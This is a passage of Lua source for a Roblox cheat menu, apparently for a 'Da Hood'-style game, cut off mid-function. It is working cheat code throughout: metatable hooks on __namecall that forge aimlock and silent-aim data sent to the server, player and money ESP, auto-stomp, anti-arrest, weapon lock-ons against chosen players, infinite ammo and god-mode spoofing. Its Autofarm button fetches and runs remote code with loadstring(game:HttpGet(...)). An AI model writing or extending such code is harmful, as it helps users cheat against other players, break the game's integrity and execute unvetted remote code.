CashAura.MouseButton1Click:Connect(function()
	if CashAuraColor.BackgroundColor3 == red then
		CashAuraColor.BackgroundColor3 = green
	else
		CashAuraColor.BackgroundColor3 = red
	end
end)

HideBlockColor.BackgroundColor3 = red
HideBlock.MouseButton1Click:Connect(function()
	if HideBlockColor.BackgroundColor3 == red then
		HideBlockColor.BackgroundColor3 = green
	else
		HideBlockColor.BackgroundColor3 = red
	end
end)

AntiStompColor.BackgroundColor3 = red
AntiStomp.MouseButton1Click:Connect(function()
	if AntiStompColor.BackgroundColor3 == red then
		AntiStompColor.BackgroundColor3 = green
	else
		AntiStompColor.BackgroundColor3 = red
	end
end)

AutoBlockColor.BackgroundColor3 = red
AutoBlock.MouseButton1Click:Connect(function()
	if AutoBlockColor.BackgroundColor3 == red then
		AutoBlockColor.BackgroundColor3 = green
	else
		AutoBlockColor.BackgroundColor3 = red
	end
end)

AutoStompColor.BackgroundColor3 = red
AutoStomp.MouseButton1Click:Connect(function()
	if AutoStompColor.BackgroundColor3 == red then
		AutoStompColor.BackgroundColor3 = green
	else
		AutoStompColor.BackgroundColor3 = red
	end
end)

AntiArrestColor.BackgroundColor3 = red
AntiArrest.MouseButton1Click:Connect(function()
	if AntiArrestColor.BackgroundColor3 == red then
		AntiArrestColor.BackgroundColor3 = green
	else
		AntiArrestColor.BackgroundColor3 = red
	end
end)

AutoDropColor.BackgroundColor3 = red
AutoDrop.MouseButton1Click:Connect(function()
	if AutoDropColor.BackgroundColor3 == red then
		AutoDropColor.BackgroundColor3 = green
	else
		AutoDropColor.BackgroundColor3 = red
	end
end)

HideUserColor.BackgroundColor3 = red
HideUser.MouseButton1Click:Connect(function()
	if HideUserColor.BackgroundColor3 == red then
		HideUserColor.BackgroundColor3 = green
		NamePos = player.Character.HumanoidRootPart.CFrame
	else
		HideUserColor.BackgroundColor3 = red
	end
end)

AntiBagColor.BackgroundColor3 = red
AntiBag.MouseButton1Click:Connect(function()
	if AntiBagColor.BackgroundColor3 == red then
		AntiBagColor.BackgroundColor3 = green
	else
		AntiBagColor.BackgroundColor3 = red
	end
end)

AltArmorColor.BackgroundColor3 = red
AltArmor.MouseButton1Click:Connect(function()
	if AltArmorColor.BackgroundColor3 == red then
		AltArmorColor.BackgroundColor3 = green
	else
		AltArmorColor.BackgroundColor3 = red
	end
end)

RocketRideColor.BackgroundColor3 = red
RocketRide.MouseButton1Click:Connect(function()
	if RocketRideColor.BackgroundColor3 == red then
		RocketRideColor.BackgroundColor3 = green
	else
		RocketRideColor.BackgroundColor3 = red
	end
end)

AntiGrabColor.BackgroundColor3 = red
AntiGrab.MouseButton1Click:Connect(function()
	if AntiGrabColor.BackgroundColor3 == red then
		AntiGrabColor.BackgroundColor3 = green
	else
		AntiGrabColor.BackgroundColor3 = red
	end
end)

AntiEffectsColor.BackgroundColor3 = red
AntiEffects.MouseButton1Click:Connect(function()
	if AntiEffectsColor.BackgroundColor3 == red then
		AntiEffectsColor.BackgroundColor3 = green
		player.PlayerGui.Framework.FBAnimation.Name = 'yea'
	else
		AntiEffectsColor.BackgroundColor3 = red
		player.PlayerGui.Framework.yea.Name = 'FBAnimation'
	end
end)
coroutine.resume(coroutine.create(function()
	RS.RenderStepped:Connect(function()
		local success,err = pcall(function()
			if AntiSlowColor.BackgroundColor3 == green and player.Character then
				local DeletePart = player.Character.BodyEffects.Movement:FindFirstChild('NoJumping') or player.Character.BodyEffects.Movement:FindFirstChild('ReduceWalk') or player.Character.BodyEffects.Movement:FindFirstChild('NoWalkSpeed')
				if DeletePart then DeletePart:Destroy() end
				if player.Character.BodyEffects.Reload.Value == true then player.Character.BodyEffects.Reload.Value = false end
			end
			if CashAuraColor.BackgroundColor3 == green and player.Character then
				for i,v in pairs(game:GetService('Workspace')['Ignored']['Drop']:GetChildren()) do
					if v:IsA('Part') then
						if (v.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 12 then
							fireclickdetector(v:FindFirstChild('ClickDetector'))
						end
					end
				end
			end
			if AntiStompColor.BackgroundColor3 == green and player.Character then
				if player.Character.BodyEffects['K.O'].Value == true then player.Character:Destroy() end
			end
			if AutoBlockColor.BackgroundColor3 == green and player.Character then
				local forbidden = {'[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
				local Found = false
				for _,v in pairs(game.Workspace.Players:GetChildren()) do
					if (v.UpperTorso.Position - player.Character.HumanoidRootPart.Position).Magnitude <= MaxDistance then
						if v.BodyEffects.Attacking.Value == true and not table.find(forbidden, v:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= player.Name then
							Found = true
							MainEvent:FireServer('Block', player.Name)
						end
					end
				end
				if Found == false and HoldingF == false then
					if player.Character.BodyEffects:FindFirstChild('Block') then player.Character.BodyEffects.Block:Destroy() end
				end
			end
			if AutoStompColor.BackgroundColor3 == green and player.Character then
				MainEvent:FireServer('Stomp')
			end
			if AntiArrestColor.BackgroundColor3 == green and player.Character then
				for _,v in pairs(game:GetService('Players'):GetChildren()) do
					if v.Character and v.DataFolder.Officer.Value == 1 then
						if (v.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 30 and player.Character.BodyEffects['K.O'].Value == true then
							player.Character:Destroy()
						end
					end
				end 
			end
			if AutoDropColor.BackgroundColor3 == green and player.Character then
				local DropAm = 10000
				if player.DataFolder.Currency.Value > 10000 then
					DropAm = '10000'
				else
					DropAm = tostring(player.DataFolder.Currency.Value)
				end
				local args = {
					'DropMoney',
					DropAm
				}
				MainEvent:FireServer(unpack(args))
			end
			if RocketRideColor.BackgroundColor3 == green and player.Character then
				local Rocket = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
				if Rocket and COOLDOWN == true then
					local RocketPart = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('RocketPart')
					if not RocketPart then
						local RocketPart = Instance.new('Part', game.Workspace.Ignored)
						RocketPart.Name = 'RocketPart'
						RocketPart.Anchored = true
						RocketPart.CanCollide = true
						RocketPart.Transparency = 1
						RocketPart.Position = Vector3.new(Rocket.Position.X, Rocket.Position.Y + 1.4, Rocket.Position.Z)
						player.Character.HumanoidRootPart.CFrame = CFrame.new(RocketPart.Position.X, RocketPart.Position.Y + 2, RocketPart.Position.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
						RIDING = true
					else
						RocketPart.Position = Vector3.new(Rocket.Position.X, Rocket.Position.Y + 1.4, Rocket.Position.Z)
						player.Character.HumanoidRootPart.CFrame = CFrame.new(RocketPart.Position.X, RocketPart.Position.Y + 2.3, RocketPart.Position.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
						RIDING = true
					end
				else
					for i,v in pairs(game:GetService('Workspace'):FindFirstChild('Ignored'):GetChildren()) do
						if v.Name == 'RocketPart' then
							v:Destroy() 
						end
						RIDING = false
					end
				end
			end
			if AntiGrabColor.BackgroundColor3 == green and player.Character then
				local GC = player.Character:FindFirstChild("GRABBING_CONSTRAINT")
				if GC then
					GC:Destroy()
					wait(0.04)
					player.Character:FindFirstChildWhichIsA('Humanoid').Sit = true
				end
			end
			if HideUserColor.BackgroundColor3 == green and player.Character then
				local WearingMask = player.Character:FindFirstChild('In-gameMask')
				local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
				if not WearingMask then
					local OwnsMask = player.Character:FindFirstChild('Mask') or player.Backpack:FindFirstChild('Mask')
					if OwnsMask then
						local MaskInventory = player.Backpack:FindFirstChild('Mask')
						if MaskInventory then
							Humanoid:EquipTool(MaskInventory)
							wait(0.1)
						end
						OwnsMask:Activate()
					else
						local ItemName = 'Mask'
						local ItemCost = 60
						local ClickDetector = game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].ClickDetector
						local Location = game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].Head.Position
						local function buy()
							wait()
							player.Character.HumanoidRootPart.CFrame = CFrame.new(Location)
							fireclickdetector(ClickDetector)
							if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
								player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
								player.Character.RightHand.Position = player.Character.RightLowerArm.Position
							end
						end
						repeat buy() until player.Backpack:FindFirstChild(ItemName) or player.DataFolder.Currency.Value <= ItemCost or player.Character:FindFirstChild(ItemName)
						player.Character.HumanoidRootPart.CFrame = NamePos
						if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
							player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
							player.Character.RightHand.Position = player.Character.RightLowerArm.Position
						end
					end
				else
					local MaskVisible = player.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle')
					if MaskVisible then
						MaskVisible:Destroy()
					end
				end
			end
			if AntiEffectsColor.BackgroundColor3 == green and player.Character then
				local Particle = player.Character.UpperTorso:FindFirstChild('ElectricuteParticle') or player.Character.UpperTorso:FindFirstChild('FlamethrowerFireParticle')
				if Particle then Particle:Destroy() end
				for i,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
					if v.Animation.AnimationId == 'rbxassetid://5641749824' then
						v:Stop() 
					end
				end
			end
		end)
	end)
end))
print("yes")
--Rpg Variables--
DS = 75
DT = 5
RpgTimer = DS
Distance = DT
RPGTarget = 'None'
-----------------


coroutine.resume(coroutine.create(function()
	RS.RenderStepped:Connect(function()
		local success, err = pcall(function()
			if Spin.Text == 'Unspin' and player.Character then
				player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(50), 0)
			end
			if MoneyESP.Text == 'UnmoneyESP' then
				for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
					if v.Name == 'MoneyDrop' then
						v.BillboardGui.AlwaysOnTop = true
						v.BillboardGui.Size = UDim2.new(0,25,0,25)
					end
				end
			end
			if Esp.Text == 'Unesp' then
				for _,v in pairs(Players:GetChildren()) do
					if v.Character then
						if not v.Character.UpperTorso:FindFirstChild('ESP') then
							local ESP = Instance.new('BillboardGui', v.Character.UpperTorso)
							ESP.StudsOffset = Vector3.new(0,3,0)
							ESP.Size = UDim2.new(4,0,1,0)
							ESP.AlwaysOnTop = true
							ESP.Name = 'ESP'
							local TextLabel = Instance.new('TextLabel', ESP)
							TextLabel.Text = (v.Name ..' | ' .. v.DisplayName)
							TextLabel.BackgroundTransparency = 1
							TextLabel.Size = UDim2.new(1,0,1,0)
							TextLabel.TextColor3 = green
						end
					end
				end
			end
			if Aimlocked ~= nil and Aimlock.Text == 'Unaimlock' and player.Character and Mouse2Down == true then
				local enemy = Aimlocked.Character
				if enemy then
					local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
					local split = string.split(pingvalue,'(')
					local ping = tonumber(split[1]) 
					local xchange
					local zchange
					if ping < 70 then
						increase = 0.27
					elseif ping < 140 then
						increase = 0.42
					elseif ping < 200 then
						increase = 0.7
					elseif ping < 350 then
						increase = 1.2
					else 
						increase = 1.6
					end
					if enemy.Humanoid.MoveDirection.X < 0 then
						xchange = -increase
					elseif enemy.Humanoid.MoveDirection.X > 0 then
						xchange = increase
					else
						xchange = 0
					end
					if enemy.Humanoid.MoveDirection.Z < 0 then
						zchange = -increase
					elseif enemy.Humanoid.MoveDirection.Z > 0 then
						zchange = increase
					else
						zchange = 0
					end
					pos = Vector3.new(enemy.Head.Position.X + enemy.Humanoid.MoveDirection.X + xchange, enemy.Head.Position.Y, enemy.Head.Position.Z + enemy.Humanoid.MoveDirection.Z + zchange)
				end
			else
				pos = mouse.Hit.p
			end
			if RPGTarget ~= nil then
				local Launcher = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('Launcher') or game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
				local TargetRPG1 = game:GetService('Workspace').Players:FindFirstChild(RPGTarget)
				if Launcher and TargetRPG1 then
					local TargetRPG = TargetRPG1:FindFirstChild('HumanoidRootPart')
					if TargetRPG then
						if RpgTimer >= 0 then
							Launcher.CFrame = CFrame.new(TargetRPG.Position.X, TargetRPG.Position.Y + 5, TargetRPG.Position.Z)
							RpgTimer = RpgTimer - 1
						else
							Launcher.CFrame = CFrame.new(TargetRPG.Position.X, TargetRPG.Position.Y + Distance, TargetRPG.Position.Z)
							Distance = Distance - 1
						end
					else
						RpgTimer = DS 
						Distance = DT
					end
				else
					RpgTimer = DS 
					Distance = DT
				end
			end
			if TazerTarget ~= nil then
				if player.Character:FindFirstChild('[Taser]') then
					local Part = player.Character['[Taser]']:FindFirstChild('Handle'):FindFirstChild('Part')
					if Part then
						local FindPlayer = game.Workspace.Players:FindFirstChild(TazerTarget):FindFirstChild('UpperTorso') or game.Workspace:FindFirstChild(TazerTarget):FindFirstChild('UpperTorso') 
						if FindPlayer then
							Part.Position = FindPlayer.Position
						end
					end
				end
			end
			if GrenadeTarget ~= nil then
				print('lookin')
				local Handle = game.Workspace['Ignored']:FindFirstChild('Handle')
				local FindPlayer = Players:FindFirstChild(GrenadeTarget)
				if Handle and FindPlayer then
					if FindPlayer.Character then
						Handle.Position = FindPlayer.Character.UpperTorso.Position
					end
				end
			end
		end)
		if err then print(err) end
	end)
end))


Camera = workspace:FindFirstChildWhichIsA('Camera')
target = false
Aimlocked = nil

local features = {
	silentaim = true;
	fov = 500;
}

function getnearest()
	local nearestmagnitude = math.huge
	local nearestenemy = nil
	local vector = nil
	for i,v in next, Players:GetChildren() do
		if v ~= Players.LocalPlayer then
			if v.Character and  v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 and v.Character.BodyEffects['K.O'].Value == false then
				local vector, onScreen = Camera:WorldToScreenPoint(v.Character["HumanoidRootPart"].Position)
				if onScreen then
					local ray = Ray.new(
						Camera.CFrame.p,
						(v.Character["Head"].Position-Camera.CFrame.p).unit*500
					)
					local ignore = {
						player.Character,
					}
					local hit,position,normal=workspace:FindPartOnRayWithIgnoreList(ray,ignore)
					if hit and hit:FindFirstAncestorOfClass("Model") and Players:FindFirstChild(hit:FindFirstAncestorOfClass("Model").Name)then
						local magnitude = (Vector2.new(mouse.X, mouse.Y) - Vector2.new(vector.X, vector.Y)).magnitude
						if magnitude < nearestmagnitude and magnitude <= features["fov"] then
							nearestenemy = v
							nearestmagnitude = magnitude
						end
					end
				end
			end
		end
	end
	return nearestenemy
end


local meta = getrawmetatable(game)
setreadonly(meta, false)
local oldNamecall = meta.__namecall
meta.__namecall = newcclosure(function(...)
	local method = getnamecallmethod()
	local args = {...}
	if string.find(method,'Ray') then
		if target then
			args[2] = Ray.new(workspace.CurrentCamera.CFrame.Position, (target + Vector3.new(0,(workspace.CurrentCamera.CFrame.Position-target).Magnitude/500,0) - workspace.CurrentCamera.CFrame.Position).unit * 500)
		end
	end
	return oldNamecall(unpack(args))
end)


local mt = getrawmetatable(game) -- aimlok
pos = Vector3.new(0,0,0)
local old = mt.__namecall
setreadonly(mt,false)
mt.__namecall = newcclosure(function(self, ...)
	local args = {...}
	if getnamecallmethod() == 'FireServer' and self.Name == 'MainEvent' then
		if tostring(args[1]) == 'UpdateMousePos' then
			if Aimlocked ~= nil then
				-- if Aimlock.Text == 'Unaimlock' then
				args[2] = pos
				--end
			end
		end
	end
	return old(self, unpack(args))
end)

mouse.Button2Down:Connect(function()
	Mouse2Down = true
	while Mouse2Down == true and Aimlock.Text == 'Unaimlock' do
		wait()
		Aimlocked = getnearest()
	end
end)
mouse.Button2Up:Connect(function()
	Mouse2Down = false
end)


Invisible.MouseButton1Click:Connect(function()
	OldInvisCFrame = player.Character.HumanoidRootPart.CFrame
	player.Character.HumanoidRootPart.CFrame = CFrame.new(318.499, 93.825, -919.513)
	wait(0.1)
	player.Character:BreakJoints()
	wait(0.1)
	player.Character.HumanoidRootPart.CFrame = OldInvisCFrame
end)

Spin.MouseButton1Click:Connect(function()
	if Spin.Text == 'Spin' then
		Spin.Text = 'Unspin'
	else
		Spin.Text = 'Spin'
	end
end)

Users.MouseButton1Click:Connect(function()
	for i,v in pairs(game.Workspace.Players:GetChildren()) do
		v:FindFirstChildWhichIsA('Humanoid').DisplayDistanceType = 'Subject'
	end
	notify('Showing masked users names')
end)

MoneyESP.MouseButton1Click:Connect(function()
	if MoneyESP.Text == 'MoneyESP' then
		MoneyESP.Text = 'UnmoneyESP'
	else
		MoneyESP.Text = 'MoneyESP'
		for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
			if v.Name == 'MoneyDrop' then
				v.BillboardGui.AlwaysOnTop = false
				v.BillboardGui.Size = UDim2.new(1,0,1,0)
			end
		end
	end 
end)

Esp.MouseButton1Click:Connect(function()
	if Esp.Text == 'Esp' then
		Esp.Text = 'Unesp'
	else
		Esp.Text = 'Esp'
		for _,v in pairs(Players:GetChildren()) do
			if v.Character then
				if v.Character.UpperTorso:FindFirstChild('ESP') then
					v.Character.UpperTorso:FindFirstChild('ESP'):Destroy()
				end
			end
		end
	end
end)

HighTool.MouseButton1Click:Connect(function()
	if player.Character:FindFirstChildWhichIsA('Tool') then
		player.Character:FindFirstChildWhichIsA('Tool').Grip = CFrame.new(0, -12, 0, 1, 0, 0, 0, 1, 0, 0, 0, -1)
	else
		notify('you have to be holding a tool')
	end
end)

LastingBullets.MouseButton1Click:Connect(function()
	if player.Character:FindFirstChildWhichIsA('Tool') then
		if player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui') then
			player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui'):Destroy()
		else
			notify('you have to be holding a gun')
		end
	else
		notify('you have to be holding a gun')
	end
end)

Aimlock.MouseButton1Click:Connect(function()
	if Aimlock.Text == 'Aimlock' then
		Aimlock.Text = 'Unaimlock'
		notify('you lock while holding rmb')
	else
		Aimlock.Text = 'Aimlock'
	end
end)

AutoFarmWarning = false
Autofarm.MouseButton1Click:Connect(function()
	if AutoFarmWarning == false then
		AutoFarmWarning = true
		notify('press again to begin autofarming, this CANNOT be stopped')
	else
		notify('Starting Autofarm')
		loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagAutofarm"))()
	end
end)

Unban.MouseButton1Click:Connect(function()
	local localPlayer = game:GetService('Players').LocalPlayer;
	local localCharacter = localPlayer.Character;
	localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
	localCharacter:ClearAllChildren()
	local newCharacter = localPlayer.CharacterAdded:Wait();
	local spoofFolder = Instance.new('Folder');
	spoofFolder.Name = 'FULLY_LOADED_CHAR';
	spoofFolder.Parent = newCharacter;
	newCharacter:WaitForChild('BodyEffects').Dead:Destroy();
	local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
	spoofValue.Name = 'Dead';
end)

FullGod.MouseButton1Click:Connect(function()
	local localPlayer = game:GetService('Players').LocalPlayer;
	local localCharacter = localPlayer.Character;
	localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
	localCharacter:ClearAllChildren()
	local newCharacter = localPlayer.CharacterAdded:Wait();
	local spoofFolder = Instance.new('Folder');
	spoofFolder.Name = 'FULLY_LOADED_CHAR';
	spoofFolder.Parent = newCharacter;
	newCharacter:WaitForChild('BodyEffects').BreakingParts:Destroy();
	local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
	spoofValue.Name = 'Dead';
end)

RpgLock.MouseButton1Click:Connect(function()
	local RpgTool = Instance.new('Tool', player.Backpack)
	RpgTool.ToolTip = 'Click a player to rpg lock them'
	RpgTool.CanBeDropped = false
	RpgTool.RequiresHandle = false
	RpgTool.Name = 'Rpg Lock'

	RpgTool.Activated:Connect(function()
		local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
		if not LowerTorso then
			LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
		end
		if LowerTorso then
			if LowerTorso.Parent.Name == 'SpecialParts' then
				RPGTarget = LowerTorso.Parent.Parent.Parent.Name
			else
				RPGTarget = LowerTorso.Parent.Name
			end
			notify('Rpg locked onto '..RPGTarget)
		else
			RPGTarget = nil
			notify('Rpg unlocked')
		end
	end)
end)

TazerTarget = nil

TaserLock.MouseButton1Click:Connect(function()
	local TazerTool = Instance.new('Tool', player.Backpack)
	TazerTool.ToolTip = 'Click a player to tazer lock them'
	TazerTool.CanBeDropped = false
	TazerTool.RequiresHandle = false
	TazerTool.Name = 'Tazer Lock'

	TazerTool.Activated:Connect(function()
		local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
		if not LowerTorso then
			LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
		end
		if LowerTorso then
			if LowerTorso.Parent.Name == 'SpecialParts' then
				TazerTarget = LowerTorso.Parent.Parent.Parent.Name
			else
				TazerTarget = LowerTorso.Parent.Name
			end
			notify('Taser locked onto '..TazerTarget, 5)
		else
			TazerTarget = nil
			notify('Taser unlocked')
		end
	end)
end)

GrenadeTarget = nil
GrenadeLock.MouseButton1Click:Connect(function()
	local GrenadeTool = Instance.new('Tool', player.Backpack)
	GrenadeTool.ToolTip = 'Click a player to grenade lock them'
	GrenadeTool.CanBeDropped = false
	GrenadeTool.RequiresHandle = false
	GrenadeTool.Name = 'Grenade Lock'

	GrenadeTool.Activated:Connect(function()
		local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
		if not LowerTorso then
			LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
		end
		if LowerTorso then
			if LowerTorso.Parent.Name == 'SpecialParts' then
				GrenadeTarget = LowerTorso.Parent.Parent.Parent.Name
			else
				GrenadeTarget = LowerTorso.Parent.Name
			end
			notify('Grenades locked onto '..GrenadeTarget, 5)
		else
			TazerTarget = nil
			notify('Grenades unlocked')
		end
	end)
end)

InfTools.MouseButton1Click:Connect(function()
	notify('Infinite Ammo Given\nhold the tool to buy ammo shoot without reloading')
	function infrev()
		if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
		end

		local Gun = '[Revolver]'
		local GunTexture = 'rbxassetid://3420082920'
		local GunPath = game:GetService("Workspace").Ignored.Shop["[Revolver] - $1300"].Head
		local Holding = false

		local InfiniteTool = Instance.new('Tool', player.Backpack)
		InfiniteTool.Name = 'Rev'
		InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
		InfiniteTool.TextureId = GunTexture
		InfiniteTool.RequiresHandle = true
		InfiniteTool.CanBeDropped = false

		local Handle = Instance.new('Part', InfiniteTool)
		Handle.Name = 'Handle'
		Handle.Anchored = false
		Handle.Size = Vector3.new(0,0,0)
		Handle.Massless = true
		Handle.Transparency = 1
		Handle.CanCollide = false

		InfiniteTool.Equipped:Connect(function()
			Holding = true
			player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
			for i,v in pairs(player.Backpack:GetChildren()) do
				if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
					if v.Ammo.Value > 0 then
						v.Parent = player.Character
					end
				end
			end
			while Holding == true do
				wait(0)
				local TotalAmmo = 0
				for i,v in pairs(player.Backpack:GetChildren()) do
					if v.Name == Gun then
						TotalAmmo = TotalAmmo + v.Ammo.Value
					end
				end
				for i,v in pairs(player.Character:GetChildren()) do
					if v.Name == Gun then
						TotalAmmo = TotalAmmo + v.Ammo.Value
					end
				end
				player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
				player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
				player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
				local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
				if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
					for i,v in pairs(player.Backpack:GetChildren()) do
						if v.Name == Gun then
							v.Parent = player.Character
						end
					end
				end
				fireclickdetector(GunPath.Parent.ClickDetector)
				if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
					player.Character:FindFirstChild(Gun).Parent = player.Backpack
					for i,v in pairs(player.Backpack:GetChildren()) do
						if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
							if v.Ammo.Value > 0 then
								v.Parent = player.Character
							end
						end
					end
				end
			end
		end)
		InfiniteTool.Unequipped:Connect(function()
			Holding = false
			player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
		end)
	end
	function infdb()
		if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
		end

		local Gun = '[Double-Barrel SG]'
		local GunTexture = 'rbxassetid://5341886203'
		local GunPath = game:GetService("Workspace").Ignored.Shop["[Double-Barrel SG] - $1400"].Head
		local Holding = false

		local InfiniteTool = Instance.new('Tool', player.Backpack)
		InfiniteTool.Name = 'Db'
		InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
		InfiniteTool.TextureId = GunTexture
		InfiniteTool.RequiresHandle = true
		InfiniteTool.CanBeDropped = false

		local Handle = Instance.new('Part', InfiniteTool)
		Handle.Name = 'Handle'
		Handle.Anchored = false
		Handle.Size = Vector3.new(0,0,0)
		Handle.Massless = true
		Handle.Transparency = 1
		Handle.CanCollide = false

		InfiniteTool.Equipped:Connect(function()
			Holding = true
			player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
			for i,v in pairs(player.Backpack:GetChildren()) do
				if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
					if v.Ammo.Value > 0 then
						v.Parent = player.Character
					end
				end
			end
			while Holding == true do
				wait(0)
				local TotalAmmo = 0
				for i,v in pairs(player.Backpack:GetChildren()) do
					if v.Name == Gun then
						TotalAmmo = TotalAmmo + v.Ammo.Value
					end
				end
				for i,v in pairs(player.Character:GetChildren()) do
					if v.Name == Gun then
						TotalAmmo = TotalAmmo + v.Ammo.Value
					end
				end
				player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
				player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
				player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
				local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
				if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
					for i,v in pairs(player.Backpack:GetChildren()) do
						if v.Name == Gun then
							v.Parent = player.Character
						end
					end
				end
				fireclickdetector(GunPath.Parent.ClickDetector)
				if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
					player.Character:FindFirstChild(Gun).Parent = player.Backpack
					for i,v in pairs(player.Backpack:GetChildren()) do
						if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
							if v.Ammo.Value > 0 then
								v.Parent = player.Character
							end
						end
					end
				end
			end
		end)
		InfiniteTool.Unequipped:Connect(function()
			Holding = false
			player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
		end)
	end
	function infrpg()
		if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
			player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
		end

		local Gun = '[RPG]'
		local GunTexture = 'rbxassetid://3420083215'
		local GunPath = game:GetService("Workspace").Ignored.Shop["[RPG] - $6000"].Head
		local Holding = false

		local InfiniteTool = Instance.new('Tool', player.Backpack)
		InfiniteTool.Name = 'Rpg'
		InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
		InfiniteTool.TextureId = GunTexture
		InfiniteTool.RequiresHandle = true
		InfiniteTool.CanBeDropped = false

		local Handle = Instance.new('Part', InfiniteTool)
		Handle.Name = 'Handle'
		Handle.Anchored = false
		Handle.Size = Vector3.new(0,0,0)
		Handle.Massless = true
		Handle.Transparency = 1
		Handle.CanCollide = false

		InfiniteTool.Equipped:Connect(function()
			Holding = true
